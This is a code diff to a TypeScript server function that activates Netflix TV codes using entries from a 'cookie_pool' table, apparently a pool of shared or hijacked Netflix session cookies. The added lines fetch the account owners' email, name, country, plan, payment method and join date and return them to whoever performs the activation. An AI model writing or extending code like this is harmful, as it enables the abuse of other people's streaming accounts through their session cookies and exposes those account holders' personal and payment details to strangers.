@@ -235,13 +235,31 @@ export const submitActivation = createServerFn({ method: "POST" })
 
       // 5f. Terminal decisions.
       if (success) {
+        // Fetch stored account metadata for the success screen.
+        const { data: meta } = await supabaseAdmin
+          .from("cookie_pool")
+          .select("email,country,plan_name,video_quality,max_streams,member_since,payment_method,name")
+          .eq("id", cookie.id)
+          .maybeSingle();
         return {
           ok: true,
           attempts: attemptNumber,
-          message: "Activation successful — opening Netflix on your TV.",
+          message: "Activation successful — Netflix is unlocking on your TV.",
           redirectUrl: `https://www.netflix.com/tv8?code=${encodeURIComponent(code)}`,
+          policy,
+          account: {
+            email: meta?.email ?? null,
+            country: meta?.country ?? null,
+            plan_name: meta?.plan_name ?? null,
+            video_quality: meta?.video_quality ?? null,
+            max_streams: meta?.max_streams ?? null,
+            member_since: meta?.member_since ?? null,
+            payment_method: meta?.payment_method ?? null,
+            name: meta?.name ?? null,
+          },
         };
       }
+
       if (outcome.status === "invalid_code" || outcome.status === "expired_code") {
         return {
           ok: false,
